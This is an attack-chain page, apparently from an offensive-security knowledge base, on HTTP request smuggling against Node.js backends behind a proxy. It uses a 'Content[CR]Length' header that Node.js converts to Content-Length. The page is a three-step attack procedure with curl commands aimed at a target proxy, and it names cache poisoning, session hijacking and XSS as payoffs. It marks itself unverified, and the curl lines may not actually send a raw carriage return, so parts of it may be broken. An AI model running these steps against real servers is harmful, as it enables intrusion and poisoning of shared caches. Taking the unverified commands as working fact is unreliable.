---
tags:
  - http-request-smuggling
  - node.js
  - proxy
  - desynchronization
type: attack_chain
tools:
  - '[[tools/curl]]'
tactics:
  - '[[Initial Access]]'
  - '[[Execution]]'
commands:
  - '[[commands/curl-send-malicious-http-request]]'
platforms:
  - Node.js
  - Web
complexity: medium
procedures:
  - '[[procedures/Craft-Malicious-HTTP-Request-with-CR-Length-Header]]'
  - '[[procedures/Send-Crafted-HTTP-Stream-to-Proxy]]'
  - '[[procedures/Observe-Request-Desynchronization-in-Node.js]]'
step_count: 3
techniques:
  - '[[Exploit Public-Facing Application]]'
description: >-
  Exploits Node.js header parsing vulnerability to perform HTTP Request
  Smuggling, leading to desynchronization between proxy and backend for attacks
  like web cache poisoning.
skill_level: intermediate
impact_level: high
id: ba5081a0-c76c-449a-845c-3eed89fd1b1b
created_at: '2025-12-13T09:01:26.035Z'
updated_at: '2025-12-13T09:01:26.035Z'
verified: false
validated: true
submitted: true
mitre_tactics:
  - '[[Initial Access]]'
  - '[[Execution]]'
mitre_techniques:
  - '[[Exploit Public-Facing Application]]'
---
# HTTP Request Smuggling in Node.js via CR-to-Hyphen Conversion

Multi-stage attack chain demonstrating how to exploit a Node.js vulnerability where carriage return (CR) characters in HTTP headers are converted to hyphens, leading to HTTP Request Smuggling. This allows desynchronization between a front-end proxy and the Node.js backend, enabling attacks such as web cache poisoning, session hijacking, and cross-site scripting.

## Chain Metrics Dashboard

| Metric | Value |
|--------|-------|
| Chain Status | Unverified |
| Total Steps | 3 |
| Execution Time | ~5 minutes |
| Skill Level | Intermediate |
| Complexity | Medium |
| Impact Level | High |

## Attack Flow Visualization

```mermaid
graph LR
    A[Step 1: Craft Request] --> B[Step 2: Send to Proxy]
    B --> C[Step 3: Observe Desync]
    style A fill:#e74c3c
    style B fill:#f39c12
    style C fill:#3498db
```

## Prerequisites & Requirements

### Required Tools

- [[tools/curl]]

### Target Environment

- Node.js backend
- Front-end proxy server
- Network access to the proxy

### Initial Access Requirements

- Ability to send HTTP requests to the proxy
- No credentials required
- External network position

## Detailed Attack Procedures

### Step 1: Craft Malicious HTTP Request
procedure: [[procedures/Craft-Malicious-HTTP-Request-with-CR-Length-Header]]

**Objective**: Create a specially crafted HTTP request that exploits the CR-to-hyphen conversion in Node.js.

**Instructions**: Construct the HTTP stream using [[commands/curl-send-malicious-http-request]] to include a header like Content[CR]Length, which will be interpreted differently by the proxy and Node.js.

```bash
curl -H "Host: target.com" -H "Content\rLength: 42" -H "Connection: Keep-Alive" --data "GET / HTTP/1.1\r\nHost: target.com\r\n\r\n" http://proxy.target.com/
```

**Expected Output**: The request is prepared with the malformed header.

**Success Indicators**:
- Malformed header included in request
- Request ready for transmission

### Step 2: Send Crafted HTTP Stream to Proxy
procedure: [[procedures/Send-Crafted-HTTP-Stream-to-Proxy]]

**Objective**: Transmit the malicious request to the front-end proxy server.

**Instructions**: Send the crafted HTTP stream to the proxy using [[commands/curl-send-malicious-http-request]]. The proxy will ignore the invalid Content[CR]Length header and assume a 0-length body.

```bash
curl --path-as-is -i -s -k -X 'GET' -H 'Host: target.com' -H 'Content\rLength: 42' -H 'Connection: Keep-Alive' --data-binary 'GET / HTTP/1.1\r\nHost: target.com\r\n\r\n' 'http://proxy.target.com/'
```

**Expected Output**: Proxy forwards the request, treating it as having no body.

**Success Indicators**:
- Request sent without errors
- Proxy processes and forwards the initial request

### Step 3: Observe Request Desynchronization
procedure: [[procedures/Observe-Request-Desynchronization-in-Node.js]]

**Objective**: Verify the desynchronization where Node.js interprets the header as Content-Length and processes subsequent requests differently.

**Instructions**: Monitor the response and any follow-up requests. Node.js will convert CR to hyphen, treat it as Content-Length: 42, and discard 42 bytes, leading to smuggling of the second request.

```bash
# Use a tool like curl or a proxy log viewer to observe responses
curl http://proxy.target.com/ -v
```

**Expected Output**: Desynchronized parsing evident in mismatched request handling.

**Success Indicators**:
- Node.js processes request with Content-Length interpretation
- Evidence of request smuggling, such as unexpected responses or cached poisoning

## Attack Chain Summary

### Key Achievements

1. Successful crafting of malicious header exploiting CR conversion
2. Desynchronization between proxy and Node.js backend
3. Potential for further attacks like web cache poisoning or XSS

## Technique & Tactic Coverage

### MITRE ATT&CK Techniques

- [[Exploit Public-Facing Application]]

### MITRE ATT&CK Tactics

- [[Initial Access]]
- [[Execution]]

*Last updated: [TIMESTAMP]*
